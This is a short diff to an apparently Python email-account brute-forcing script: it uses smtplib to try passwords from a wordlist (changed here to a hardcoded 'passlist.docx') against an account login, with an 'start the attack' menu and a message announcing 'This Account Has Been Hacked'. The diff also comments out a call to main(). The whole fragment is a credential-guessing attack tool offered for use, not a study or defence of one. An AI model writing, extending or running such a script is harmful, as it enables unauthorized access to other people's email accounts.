@@ -2,12 +2,11 @@
 import smtplib
 from os import system
 
-
 print ('[1] start the attack')
 print ('[2] exit')
 option = input('==>')
 if (option == '1'):
-   file_path = input('path of passwords file :')
+   file_path = 'passlist.docx'
 else:
    system('clear')
    exit()
@@ -24,7 +23,7 @@ def login():
       try:
          server.login(user_name, password)
          system('clear')
-         main()
+         #main()
          print ('\n')
          print ('[+] This Account Has Been Hacked Password :' + password + '     ^_^')
          break
